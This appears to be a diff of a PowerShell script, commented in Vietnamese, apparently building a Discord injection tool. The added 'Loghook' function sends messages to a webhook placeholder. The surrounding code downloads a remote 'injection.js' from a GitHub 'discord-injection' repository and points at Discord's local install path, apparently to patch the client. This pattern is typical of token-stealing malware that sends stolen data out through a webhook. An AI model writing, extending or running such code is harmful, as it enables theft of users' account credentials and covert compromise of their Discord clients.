@@ -1,4 +1,33 @@
 # URL của tệp cần tải
+
+function Loghook {
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [string]$Message
+    )
+
+    # Define the webhook URL
+    $webhookUrl = "YOUR_WEBHOOK_HERE2"
+
+    # Create the payload
+    $payload = @{
+        content = $Message
+    } | ConvertTo-Json
+
+    # Send the POST request to the webhook
+    try {
+        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+        Write-Output "Message sent successfully."
+    }
+    catch {
+        Write-Error "Failed to send message: $_"
+    }
+}
+
+# Example usage
+
+
+
 $url = "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/injection.js"
 
 # Đường dẫn cục bộ của Discord
